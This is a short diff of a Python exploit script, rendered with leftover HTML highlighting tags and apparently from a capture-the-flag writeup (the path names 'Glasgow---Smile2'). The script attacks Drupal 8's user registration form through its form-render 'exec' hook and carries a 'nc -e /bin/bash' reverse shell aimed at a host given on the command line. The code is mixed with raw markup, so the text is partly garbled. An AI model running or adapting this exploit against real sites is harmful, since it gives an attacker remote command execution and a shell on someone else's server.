@@ -139,7 +139,7 @@ MetaGenerator[</span><span class="kd">Drupal 8</span><span class="p">]</span>
     exit(</span><span class="no">1</span><span class="p">)
 
 </span><span class="kd">def</span><span class="k"> cmd</span><span class="p">():
-    time.sleep(1)
+    time.sleep(</span><span class="no">1</span><span class="p">)
     target </span><span class="kd">=</span><span class="k"> f</span><span class="s2">"http://{sys.argv[1]}/Glasgow---Smile2/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"</span><span class="p">
     data </span><span class="kd">=</span><span class="p"> { </span><span class="s2">'form_id'</span><span class="p">:</span><span class="s2"> 'user_register_form'</span><span class="p">,</span><span class="s2"> '_drupal_ajax'</span><span class="p">:</span><span class="s2"> '1'</span><span class="p">,</span><span class="s2"> 'mail[#post_render][]'</span><span class="p">:</span><span class="s2"> 'exec'</span><span class="p">,</span><span class="s2"> 'mail[#type]'</span><span class="p">:</span><span class="s2"> 'markup'</span><span class="p">,</span><span class="s2"> 'mail[#markup]'</span><span class="p">:</span><span class="k"> f</span><span class="s2">"nc -e /bin/bash {sys.argv[2]} 443" </span><span class="p">}
     requests.post(target, </span><span class="no">data</span><span class="kd">=</span><span class="p">data)
